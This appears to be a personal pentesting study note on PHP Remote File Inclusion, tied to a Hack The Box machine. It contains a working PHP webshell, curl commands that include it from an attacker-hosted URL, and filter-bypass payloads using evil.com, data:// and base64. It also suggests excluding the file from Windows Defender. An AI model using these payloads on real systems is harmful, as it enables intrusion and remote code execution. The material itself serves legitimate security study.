---
date created: Thursday, January 1st 2026, 2:45:25 pm
date modified: Thursday, January 8th 2026, 10:42:10 am
---

# Remote File Inclusion (RFI)

> [!WARNING] Windows Defender may flag this file due to PHP webshell examples. Add an exclusion in your notes folder or this file specifically. All code is educational.

## What is It?
A vulnerability where an application includes files from a remote server based on user-controlled input. More dangerous than LFI because attackers can include their own malicious scripts, leading directly to Remote Code Execution (RCE).

## Prerequisites
For RFI to work (in PHP):
- `allow_url_include = On` (off by default in modern PHP)
- `allow_url_fopen = On`

## Common Vulnerable Parameters
- `?page=`
- `?lang=`
- `?file=`
- `?template=`
- `?inc=`

## Basic Exploitation

### 1. Host a Malicious File
```bash
# Simple PHP webshell (shell.php)
<?php system($_GET['cmd']); ?>

# Start a local server
python3 -m http.server 80
```

### 2. Include it via the Vulnerable Parameter
```bash
curl "http://target.com/index.php?page=http://YOUR_IP/shell.php"

# With command execution
curl "http://target.com/index.php?page=http://YOUR_IP/shell.php&cmd=whoami"
```

## Filter Bypasses:

Bypassing occurs often with obfuscation or encoding to bypass malicious strings checks by AV systems like Windows Defender, etc.

- Null byte: `http://evil.com/shell.php%00`
- Parameter truncation: `http://evil.com/shell.php?`
- Alternate protocols: `data://text/plain,<?php system('whoami'); ?>`
- Encode slashes: `http:%252f%252fevil.com/shell.php`

## Common Payloads
```bash
# Basic inclusion
http://YOUR_IP/shell.php

# Data wrapper (no external hosting needed)
data://text/plain,<?php system('id'); ?>

# Base64 encoded
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

## Detection
- Look for parameters accepting URLs or paths
- Test with external callback (Burp Collaborator, webhook.site)
- Check for DNS/HTTP requests to your server

## Tools
- Burp Suite - intercept and modify requests
- python http.server - host malicious files
- netcat - catch reverse shells
- webhook.site / Burp Collaborator - detect blind RFI

## RFI Vs LFI

| Aspect        | LFI               | RFI                          |
| ------------- | ----------------- | ---------------------------- |
| File location | Local (on target) | Remote (attacker-controlled) |
| Direct RCE    | Requires chaining | Yes                          |
| Prerequisites | Fewer             | Specific PHP settings        |
| Prevalence    | More common       | Rarer (disabled by default)  |

## Escalation Path
1. Confirm RFI with benign file
2. Host webshell
3. Include and execute commands
4. Upgrade to reverse shell

## References:
- [HackTricks RFI](<https://book.hacktricks.xyz/pentesting-web/file-inclusion#remote-file-inclusion>)
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
## Seen In:
- [[../../../HTB/Starting Point/Tier 1 - Machines/Responder#Exploitation|Responder]] 
